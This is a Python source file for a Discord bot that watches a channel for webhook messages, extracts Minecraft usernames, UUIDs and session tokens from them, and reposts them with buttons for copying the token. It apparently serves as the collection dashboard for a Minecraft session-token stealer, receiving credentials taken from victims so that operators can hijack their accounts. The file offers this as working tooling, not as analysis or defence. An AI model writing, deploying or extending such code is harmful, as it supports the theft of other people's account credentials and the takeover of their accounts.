
import discord
from discord.ext import commands
from discord.ui import Button, View
import re
import os
import asyncio
import logging
from aiohttp import web

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration from environment variables
TOKEN = os.environ.get('DISCORD_BOT_TOKEN')
CHANNEL_ID = int(os.environ.get('CHANNEL_ID', 0))
PORT = int(os.environ.get('PORT', 8080))

if not TOKEN:
    raise ValueError("DISCORD_BOT_TOKEN environment variable not set")
if not CHANNEL_ID:
    raise ValueError("CHANNEL_ID environment variable not set")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

class AccountView(View):
    def __init__(self, username, uuid, session_token):
        super().__init__(timeout=None)
        
        # Store data
        self.username = username
        self.uuid = uuid
        self.session_token = session_token
        
        # Copy Session button (Primary/Blue) - LEFT
        session_button = Button(label="Copy Session", style=discord.ButtonStyle.primary)
        session_button.callback = self.session_callback
        self.add_item(session_button)
        
        # Copy UUID button (Secondary/Gray) - MIDDLE
        uuid_button = Button(label="Copy UUID", style=discord.ButtonStyle.secondary)
        uuid_button.callback = self.uuid_callback
        self.add_item(uuid_button)
        
        # Copy Username button (Secondary/Gray) - RIGHT
        username_button = Button(label="Copy Username", style=discord.ButtonStyle.secondary)
        username_button.callback = self.username_callback
        self.add_item(username_button)
    
    async def session_callback(self, interaction: discord.Interaction):
        await interaction.response.send_message(f"```\n{self.session_token}\n```", ephemeral=True)
        logger.info(f"Session token copied by {interaction.user}")
    
    async def uuid_callback(self, interaction: discord.Interaction):
        await interaction.response.send_message(f"```\n{self.uuid}\n```", ephemeral=True)
        logger.info(f"UUID copied by {interaction.user}")
    
    async def username_callback(self, interaction: discord.Interaction):
        await interaction.response.send_message(f"```\n{self.username}\n```", ephemeral=True)
        logger.info(f"Username copied by {interaction.user}")

def parse_account_data(content):
    """Parse the account data from the webhook message"""
    # Extract username - preserves capitalization
    username_match = re.search(r'Username:\s*(\S+)', content, re.IGNORECASE)
    username = username_match.group(1) if username_match else "Unknown"
    
    # Extract UUID
    uuid_match = re.search(r'UUID:\s*([0-9a-fA-F-]+)', content, re.IGNORECASE)
    uuid = uuid_match.group(1) if uuid_match else "Unknown"
    
    # Extract session token
    session_match = re.search(r'Session Token:\s*(\S+)', content, re.IGNORECASE)
    session_token = session_match.group(1) if session_match else "Unknown"
    
    return username, uuid, session_token

@bot.event
async def on_ready():
    logger.info(f'{bot.user} has connected to Discord!')
    logger.info(f'Monitoring channel ID: {CHANNEL_ID}')
    
    # Set bot status
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, 
        name="for Minecraft accounts"
    ))

@bot.event
async def on_message(message):
    # Ignore bot's own messages
    if message.author.id == bot.user.id:
        return
    
    # Check if message is in the monitored channel and is from a webhook
    if message.channel.id == CHANNEL_ID and message.webhook_id:
        logger.info(f"Webhook message received in channel {message.channel.name}")
        
        # Parse the account data
        username, uuid, session_token = parse_account_data(message.content)
        
        if username != "Unknown" and uuid != "Unknown":
            # Create embed
            embed = discord.Embed(
                title="🎮 Minecraft Account Received",
                description=f"**Username:** {username}\n**UUID:** `{uuid}`",
                color=0x5865F2  # Discord blurple
            )
            embed.set_footer(text="Click buttons to copy data • Only visible to you")
            
            # Create view with buttons
            view = AccountView(username, uuid, session_token)
            
            # Send the embed with buttons
            await message.channel.send(embed=embed, view=view)
            logger.info(f"Account embed sent for {username}")
            
            # Optionally delete the original webhook message
            # await message.delete()
    
    await bot.process_commands(message)

@bot.command(name='ping')
async def ping(ctx):
    """Simple ping command to check if bot is alive"""
    await ctx.send(f'Pong! Latency: {round(bot.latency * 1000)}ms')

@bot.command(name='stats')
async def stats(ctx):
    """Show bot stats"""
    embed = discord.Embed(title="Bot Stats", color=0x5865F2)
    embed.add_field(name="Guilds", value=len(bot.guilds))
    embed.add_field(name="Users", value=sum(g.member_count for g in bot.guilds))
    embed.add_field(name="Latency", value=f"{round(bot.latency * 1000)}ms")
    await ctx.send(embed=embed)

# Web server for Render health checks
async def health_check(request):
    return web.Response(text="Bot is running!")

async def start_webserver():
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"Health check server started on port {PORT}")

async def main():
    # Start health check server
    asyncio.create_task(start_webserver())
    
    # Start bot
    async with bot:
        await bot.start(TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
